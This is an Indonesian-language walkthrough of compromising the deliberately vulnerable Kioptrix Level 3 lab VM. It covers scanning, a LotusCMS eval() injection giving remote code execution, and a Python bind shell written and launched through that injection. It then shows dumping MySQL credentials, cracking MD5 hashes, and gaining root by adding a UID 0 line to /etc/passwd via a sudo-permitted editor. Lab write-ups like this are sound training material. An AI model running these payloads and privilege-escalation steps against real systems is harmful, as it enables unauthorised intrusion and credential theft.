# Kioptrix VM3 — Penetration Testing Walkthrough

> **Target:** Kioptrix Level 1.2 (#3) | **Attacker:** Arch Linux | **Network:** Host-Only (vboxnet0)

---

## 1. Persiapan VM

```bash
VBoxManage createvm --name "KioptrixVM3" --ostype "Linux26" --register
VBoxManage modifyvm "KioptrixVM3" --memory 512 --cpus 1
VBoxManage storagectl "KioptrixVM3" --name "IDE Controller" --add ide
VBoxManage storageattach "KioptrixVM3" --storagectl "IDE Controller" --port 0 --device 0 --type hdd --medium "/home/admin/Downloads/KioptrixVM3/KioptrixVM3.vmdk"
VBoxManage modifyvm "KioptrixVM3" --nic1 hostonly --hostonlyadapter1 vboxnet0
VBoxManage modifyvm "KioptrixVM3" --nictype1 Am79C973
VBoxManage modifyvm "KioptrixVM3" --audio-driver none
```

---

## 2. Reconnaissance

### Network Discovery

```bash
nmap -sn 192.168.56.0/24
```

Target ditemukan di **192.168.56.104**.

### Port Scan

```bash
nmap -sV -sC -p- 192.168.56.104
```

| Port | Service | Versi |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 4.7p1 Debian |
| 80/tcp | HTTP | Apache 2.2.8 + PHP 5.2.4 + Suhosin-Patch |

---

## 3. Web Enumeration

### Tambah /etc/hosts

```bash
echo "192.168.56.104 kioptrix3.com" | sudo tee -a /etc/hosts
```

### Directory Brute-Force

```bash
gobuster dir -u http://192.168.56.104/ -w /usr/share/dirb/wordlists/common.txt -x php,txt,html
```

**Temuan penting:**

- `/gallery` → Gallarific CMS
- `/gallery/gadmin` → halaman login admin (tersembunyi di komentar HTML)
- `/phpmyadmin` → phpMyAdmin
- `/core`, `/modules` → struktur khas **LotusCMS**

### Identifikasi CMS

```bash
curl -s http://192.168.56.104/ | grep -i lotus
# <meta name="keywords" content="LotusCMS" />
```

CMS terkonfirmasi: **LotusCMS**. Gallery menggunakan **Gallarific**.

---

## 4. Eksploitasi — LotusCMS RCE

### Vulnerability

LotusCMS 3.0 rentan terhadap **Remote Code Execution** via parameter `page` yang diproses oleh fungsi `eval()` tanpa sanitasi (`router.php` baris 26).

> **Catatan penting:** Tambahkan flag `-g` pada curl untuk menonaktifkan URL globbing (karena karakter `{` `}` diinterpretasi oleh curl sebagai glob syntax).

### Konfirmasi RCE

```bash
curl -g -s "http://kioptrix3.com/index.php?page=index');phpinfo();/*"
```

Output phpinfo() muncul — RCE terkonfirmasi.

**Info penting dari phpinfo:**

- `magic_quotes_gpc: Off`
- `disable_functions: (kosong)` — semua fungsi PHP bisa dipakai
- `safe_mode: Off`
- User: `www-data`

### Reverse Shell

Karena Suhosin Patch memblokir karakter `&` dalam argumen shell, gunakan Python bind shell sebagai alternatif.

**Tulis script Python ke server:**

```bash
curl -g -s "http://kioptrix3.com/index.php" -G \
  --data-urlencode "page=index');\$code='import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((\"0.0.0.0\",8888))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call([\"/bin/sh\",\"-i\"])';file_put_contents('/tmp/b.py',\$code);echo 'WRITTEN';//"
```

**Jalankan script:**

```bash
curl -g -s "http://kioptrix3.com/index.php" -G \
  --data-urlencode "page=index');system('python /tmp/b.py &');/*"
```

**Connect dari host:**

```bash
nc -v 192.168.56.104 8888
```

Shell didapat sebagai `www-data`.

---

## 5. Post-Exploitation — Credential Hunting

### Temukan Konfigurasi MySQL

```bash
cat /home/www/kioptrix3.com/gallery/gconfig.php
```

```
gallarific_mysql_username = root
gallarific_mysql_password = fuckeyou
```

### Dump Database

```bash
mysql -u root -pfuckeyou -e "use gallery; select * from dev_accounts;"
```

| ID | Username | Password Hash (MD5) |
| --- | --- | --- |
| 1 | dreg | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |

```bash
mysql -u root -pfuckeyou -e "use gallery; select * from gallarific_users;"
# admin : n0t7t1k4
```

### Crack Password

```bash
echo "0d3eccfb887aabd50f243b3f155c0f85" > /tmp/hash1.txt
echo "5badcaf789d3d1d09794d8f021f40f0e" > /tmp/hash2.txt
john --format=raw-md5 /tmp/hash1.txt /tmp/hash2.txt
```

**Hasil:**

| Username | Password |
| --- | --- |
| dreg | Mast3r |
| loneferret | **starwars** |

---

## 6. Privilege Escalation

### Login sebagai loneferret

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su loneferret
# password: starwars
```

Atau via SSH langsung:

```bash
# Buka xterm (lebih stabil untuk editor TUI)
xterm -e ssh -oHostKeyAlgorithms=+ssh-rsa loneferret@192.168.56.104
```

> **Penting:** Gunakan xterm untuk stabilitas editor. Jangan gunakan ydotool karena dapat merusak VM.

### Cek Sudo Permission

```bash
sudo -l
```

```
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht
```

loneferret bisa menjalankan editor **ht** sebagai root, tapi tidak bisa `su` langsung (diblokir oleh `!`).

### Edit /etc/passwd via ht

**Step 1 — Generate hash password baru (di terminal Arch):**

```bash
openssl passwd -1 hacked123
# Output contoh: $1$pvdjstcV$siAOUUMCdEIJOdPURseps.
```

**Step 2 — Buka /etc/passwd dengan ht (di xterm):**

```bash
export TERM=xterm
sudo /usr/local/bin/ht /etc/passwd
```

**Step 3 — Navigasi di dalam ht:**

1. Tekan **F3** → pilih file dari history → **arrow down** → pilih `/etc/passwd`
2. Tekan **F6** → pilih **text** → Enter (ganti ke text mode)
3. Navigasi ke baris paling bawah file
4. Tambahkan baris baru:

```
hacker:$1$pvdjstcV$siAOUUMCdEIJOdPURseps.:0:0:root:/root:/bin/bash
```

5. Tekan **F2** → save
6. Tekan **F10** → keluar

**Step 4 — Login sebagai root:**

```bash
su hacker
# password: hacked123
id
# uid=0(root) gid=0(root) groups=0(root)
```

**ROOT BERHASIL!**

---

## Rangkuman Jalur Serangan

```
Recon (nmap + gobuster)
    ↓
Identifikasi LotusCMS + Gallarific
    ↓
RCE via LotusCMS eval() injection
    ↓
Shell sebagai www-data
    ↓
Dump MySQL credentials (root:fuckeyou)
    ↓
Crack MD5 hash → loneferret:starwars
    ↓
SSH sebagai loneferret
    ↓
sudo ht → edit /etc/passwd
    ↓
ROOT
```

---

## Catatan Teknis

- **curl -g flag** wajib dipakai saat payload mengandung karakter `{` `}` untuk menonaktifkan URL globbing.
- **Suhosin Patch** memblokir karakter `&` dalam argumen system() — gunakan Python bind shell sebagai workaround.
- **ht editor** di Arch Linux berjalan di Wayland — ydotool tidak reliable untuk automasi, lebih aman ketik manual.
- Format `/etc/passwd` harus tepat 6 titik dua: `user:hash:UID:GID:comment:home:shell`.
